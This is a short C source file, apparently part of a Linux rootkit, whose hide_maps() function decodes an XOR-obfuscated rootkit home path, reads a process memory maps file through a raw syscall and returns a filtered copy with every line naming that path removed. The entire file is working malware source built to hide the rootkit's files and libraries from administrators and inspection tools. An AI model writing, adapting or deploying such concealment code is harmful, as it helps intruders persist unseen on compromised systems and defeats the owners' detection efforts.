#include "../rkconsts.h"

FILE* hide_maps(char *path) {
    DEBUG_MSG("[-] hide_maps() called\n");
    char buf[8192];

    char *rk_home = strdup(RK_HOME); xor(rk_home);
    FILE* tmp_fp = tmpfile(); 
    int maps_fd = syscall(2, path, O_RDONLY);
    printf("%d\n", maps_fd);
    FILE* maps_fp = fdopen(maps_fd, "r");
    while (fgets(buf, sizeof(buf), maps_fp) != NULL) {
        printf("%s\n", buf);
        if (!strstr(buf, rk_home)) {
            fputs(buf, tmp_fp);
        }
        else {
            DEBUG_MSG("[!] Skipping line\n");
        }
    }
    fclose(maps_fp);
    fseek(tmp_fp, 0, SEEK_SET);
    CLEAN(rk_home);
    return tmp_fp;
}